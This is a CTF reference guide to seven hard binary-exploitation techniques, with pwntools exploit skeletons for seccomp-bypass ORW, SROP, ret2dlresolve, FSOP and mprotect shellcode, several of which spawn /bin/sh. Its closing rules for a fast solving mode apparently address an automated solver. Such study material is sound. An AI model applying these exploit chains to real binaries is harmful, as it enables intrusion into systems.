# Hard-Pwn Lane Taxonomy & Fast Exploit Selector

> Reference guide for high-tier binary exploitation (Pwn) CTF challenges.
> Standardizes the 7 canonical hard-pwn lanes with fast decision trees, primitive checks, and copy-paste pwntools exploit skeletons.

---

## 1. Quick Decision Tree (Checksec & Primitives -> Lane Selection)

```
Checksec & Primitives:
├── Seccomp filter detected (seccomp-tools dump ./vuln)
│   ├── Syscalls permitted: open/openat, read, write
│   │   └── LANE 1: seccomp-orw
│   └── Syscalls heavily restricted (architecture switch, aliased syscalls, chroot)
│       └── LANE 2: sandbox-orw
├── Stack overflow / ROP available, but few gadgets
│   ├── Gadget: pop rax (or read returning 15) + syscall; ret
│   │   └── LANE 3: srop (Sigreturn-Oriented Programming)
│   └── No libc leak, No PIE, Partial RELRO, unconstrained read to BSS
│       └── LANE 4: ret2dlresolve
├── Heap corruption (UAF, double-free, off-by-one)
│   ├── Glibc >= 2.34 (hooks removed: __free_hook, __malloc_hook)
│   │   └── LANE 5: heap-fsop (House of Apple 2 / _IO_FILE vtable)
│   └── Calloc used instead of malloc (bypasses tcache directly)
│       └── LANE 6: heap-tcache-stash (Tcache Stashing Unlink)
└── RWX segment present or mprotect available
    └── LANE 7: shellcode-mmap (RWX jump or mprotect ROP)
```

---

## 2. The 7 Canonical Hard-Pwn Lanes

### Lane 1: `seccomp-orw`
- **When to use**: `seccomp-tools dump ./vuln` shows `execve` and `execveat` are killed (`KILL` / `ERRNO`), but `open` / `openat`, `read`, and `write` are allowed.
- **Goal**: Open `./flag` (or `/flag`), read contents into memory, write to stdout (fd=1).
- **Pwntools Skeleton**:
  ```python
  from pwn import *
  context.arch = 'amd64'
  
  # Option A: Pure shellcode (when execution control is on stack/heap)
  shellcode = shellcraft.open('./flag')
  shellcode += shellcraft.read('rax', 'rsp', 0x100)
  shellcode += shellcraft.write(1, 'rsp', 0x100)
  
  # Option B: ROP ORW chain
  # 1. openat(AT_FDCWD, "./flag", O_RDONLY)
  # 2. read(3, bss_addr, 0x100)
  # 3. write(1, bss_addr, 0x100)
  ```

---

### Lane 2: `sandbox-orw`
- **When to use**: Strict seccomp or container sandbox blocking standard `open(2)`.
- **Key Techniques**:
  - **Architecture switch (`retf`)**: Switch from x86_64 to x86_32 mode to bypass 64-bit seccomp rules:
    ```nasm
    push 0x23; push offset_compat; retf; [bits 32] int 0x80 ...
    ```
  - **Syscall aliasing**: Use `openat(0, "./flag", 0)` or `openat2` instead of `open`.
  - **Time-based blind exfiltration**: When stdout/stderr are closed, compare flag bytes in a loop and trigger `sleep(2)` or infinite loop on match.

---

### Lane 3: `srop` (Sigreturn-Oriented Programming)
- **When to use**: Arbitrary stack write, `syscall; ret` gadget, and ability to set `rax = 15` (`SYS_rt_sigreturn`).
- **Required Primitives**: Controllable `rax=15` (e.g. via `read(0, buf, 15)`) + `syscall; ret`.
- **Pwntools Skeleton**:
  ```python
  from pwn import *
  context.arch = 'amd64'

  frame = SigreturnFrame()
  frame.rax = constants.SYS_execve
  frame.rdi = binsh_addr
  frame.rsi = 0
  frame.rdx = 0
  frame.rip = syscall_gadget

  payload = b'A' * offset
  payload += p64(pop_rax_syscall)  # or read() returning 15
  payload += bytes(frame)
  ```

---

### Lane 4: `ret2dlresolve`
- **When to use**: 32-bit or 64-bit ELF with **No PIE**, **Partial RELRO**, and **No Libc Leak**.
- **Mechanism**: Exploit the dynamic linker's `_dl_runtime_resolve(link_map, reloc_arg)` by forging a fake relocation structure in `.bss`.
- **Pwntools Skeleton**:
  ```python
  from pwn import *
  context.binary = elf = ELF('./vuln')
  rop = ROP(elf)

  dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
  rop.read(0, dlresolve.data_addr)
  rop.ret2dlresolve(dlresolve)

  payload = fit({offset: rop.chain(), (offset + len(rop.chain())): dlresolve.payload})
  ```

---

### Lane 5: `heap-fsop` (House of Apple 2)
- **When to use**: Glibc >= 2.34 where `__malloc_hook` and `__free_hook` are removed.
- **Target**: Control over `_IO_list_all` pointer or an active `FILE` pointer (`stderr`, `stdout`).
- **Mechanism**: Set `fp->_wide_data->_wide_vtable` to point to a crafted vtable containing `system` at `_IO_wfile_overflow` (offset `0x18`).
- **Payload Layout**:
  - `fp->_flags = "  sh;"` or `";sh;"`
  - `fp->_wide_data = fake_wide_data`
  - `fake_wide_data->_wide_vtable = fake_vtable`
  - Trigger via `exit(0)` or returning from `main()`.

---

### Lane 6: `heap-tcache-stash`
- **When to use**: Target program allocates memory using `calloc()` (which does NOT fetch from tcache, but traverses smallbins) and frees to tcache/fastbin.
- **Mechanism**: Fill tcache (7 chunks), put 2+ chunks into smallbin. Allocate 1 chunk from smallbin with tcache having slots -> glibc stashes remaining smallbin chunks into tcache, triggering an uncheck unlink write to `bck->fd = bin`.

---

### Lane 7: `shellcode-mmap`
- **When to use**: Binary has an RWX segment (check `readelf -l binary`) or allows ROP call to `mprotect(aligned_addr, 0x1000, 7)`.
- **Pwntools Skeleton**:
  ```python
  from pwn import *
  context.arch = 'amd64'

  rop = ROP(elf)
  rop.mprotect(page_base, 0x1000, 7)
  rop.read(0, page_base, len(shellcode))
  rop.call(page_base)
  ```

---

## 3. Fastest / Speedrun Execution Rule

When operating in `--fast` or `--blitz` mode:
1. **Commit to 1 Lane**: Never run multiple competing exploit chains simultaneously on the same binary.
2. **Local Verification First**: Always run `wsl -d kali-linux bash -c "python3 solve.py"` locally before firing at remote.
3. **Stop-on-Flag**: The instant a flag candidate matching `flag{...}` is emitted, stop all debugging immediately and output the high-visibility flag banner.
